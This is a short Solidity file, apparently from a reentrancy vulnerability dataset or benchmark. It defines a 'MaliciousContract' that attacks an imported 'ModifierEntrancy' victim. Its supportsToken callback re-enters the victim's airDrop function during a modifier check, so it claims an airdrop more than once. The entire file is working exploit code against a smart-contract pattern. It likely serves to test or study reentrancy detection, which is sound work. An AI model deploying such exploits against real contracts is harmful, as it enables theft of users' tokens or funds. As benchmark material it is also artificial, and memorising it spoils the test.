pragma solidity ^0.4.10;

import "../dataset/reentrancy/modifier_reentrancy.sol";

contract MaliciousContract {
    ModifierEntrancy modifierentrancy;
    bool public hasBeenCalled;

    constructor(address _victimAddress) public {
        modifierentrancy = ModifierEntrancy(_victimAddress);
    }

    function initiateAttack() public {
        // the attack consist on making the contract give as much ether as possible
        //by pretending the contract has 0 balance and faking the modifier supportsToken
        modifierentrancy.airDrop();
    }

    // This function will be called during the supportsToken modifier
    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            modifierentrancy.airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }

    // Helper function to check the token balance
    function getTokenBalance() public view returns (uint256) {
        return modifierentrancy.tokenBalance(address(this));
    }
}
